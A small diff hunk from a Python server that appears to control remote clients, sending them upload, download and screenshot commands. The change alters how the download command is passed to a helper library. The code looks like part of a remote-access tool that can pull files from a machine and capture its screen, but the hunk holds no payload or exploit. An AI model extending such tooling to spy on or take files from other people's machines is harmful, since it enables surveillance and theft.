@@ -61,8 +61,7 @@ def handle_client(conn, addr, command_queue):
                             lib.upload_file(file_path, conn)
 
                         if command.startswith("download"):
-                            file_path = command.split(" ")[1]
-                            lib.download_file(file_path, conn)
+                            lib.download_file(command, conn)
 
                         if command == "screenshot":
                             # random str (8char) to avoid conflict
